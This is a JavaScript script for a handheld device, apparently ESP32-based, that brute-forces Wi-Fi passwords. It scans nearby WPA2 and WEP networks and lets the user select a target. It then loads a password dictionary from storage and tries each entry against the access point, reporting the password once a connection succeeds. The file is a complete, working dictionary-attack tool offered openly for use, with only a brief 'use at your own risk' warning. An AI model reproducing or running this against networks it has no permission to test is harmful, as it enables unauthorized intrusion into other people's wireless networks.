var dialog = require('dialog');
var wifi = require('wifi');
var storage = require('storage');
var keyboard = require('keyboard');
var display = require('display');
var serial = require('serial');

var dialogMessage = dialog.info;
var dialogChoice = dialog.choice;
var dialogError = dialog.error;

var wifiScan = wifi.scan;
var wifiConnect = wifi.connect;
var wifiDisconnect = wifi.disconnect;

var fillScreen = display.fill;

var serialPrintln = serial.println;

// Wifi dictionary-based attacker
// use at your own risk, some devices may lock you out as a security mechanism when spammed with this!

function wifiDictAttack(ssid, pwds) {
  var connected = false;
  // iterate over the passwords
  for( var i=0; i<pwds.length; i++ ) {
      if(!pwds[i].trim()) continue;  // skip empty lines
      serialPrintln("Trying password for " + ssid + ": " + pwds[i]);
      dialogMessage("Trying pwd " + (i+1) + "/" + pwds.length);
      connected = wifiConnect(ssid, 3, pwds[i]);  // timeout is 3s
      if(connected) {
        serialPrintln("Password found for " + ssid + ": " + pwds[i]);
        dialogMessage("Pwd found: " + pwds[i], true);
        return;
      }
      delay(10);  // yield to avoid watchdog reset
      if(keyboard.getEscPress()) break;  // user abort
    }
  dialogError("Pwd not found", true);
}

var network_to_attack_ssid = "";
var passwords_to_try_arr = [];

while(true)
{

  var choice = dialogChoice({
    ["Select AP"]: "scan",
    ["Load dict"]: "load",
    ["Start attack"]: "attack"
  });

  if(choice=="") {
    break;  // quit
  }
  if(choice=="scan") {
    dialogMessage("Scanning..");
    var networks = wifiScan();
    delay(10000);

    if(!networks.length) {
      dialogError("no wifi networks found!");
      continue;
    }
    var networks_choices = {};
    for (var i = 0; i < networks.length; i++) {
      var net = networks[i];
      if (net.encryptionType == "WPA2_PSK" || net.encryptionType == "WEP") {
        var label = net.SSID + " (" + net.RSSI + " dBm)" + "[" + net.MAC + "]";
        networks_choices[label] = net.SSID;  // chave visível, valor retornado
      }
    }
    network_to_attack_ssid = dialogChoice(networks_choices);
  }
  else if(choice=="load") {
    var passwords_file = dialog.pickFile("/");
    if(!passwords_file) continue;
    var passwords_to_try = storage.read(passwords_file);  // MEMO: 4kb file limit -> use native open+read?
    if(!passwords_to_try) continue;
    var raw_passwords = passwords_to_try.split("\n");
    passwords_to_try_arr = [];
    for (var i = 0; i < raw_passwords.length; i++) {
      var pwd = raw_passwords[i];
      pwd = pwd.replace(/\r/g, '').trim();
      if (pwd) {
        passwords_to_try_arr.push(pwd);
      }
    }
  }
  else if(choice=="attack") {
    if(!network_to_attack_ssid) {
      dialogError("no wifi network selected, pls rescan");
      continue;
    }
    if(passwords_to_try_arr.length == 0) {
      dialogError("no passwords dict loaded");
      continue;
    }
    //print("trying attacking network " + networks[i].SSID + " " + networks[i].MAC);
    dialogMessage("Attacking..");

    keyboard.setLongPress(true);
    wifiDictAttack(network_to_attack_ssid, passwords_to_try_arr);
    keyboard.setLongPress(false);

    wifiDisconnect();  // avoid automatic reconnection retry to the last network
  } // end if attack

  fillScreen(0); // clear screen
}


// 2FIX: tries to reconnect? https://github.com/espressif/arduino-esp32/issues/7968

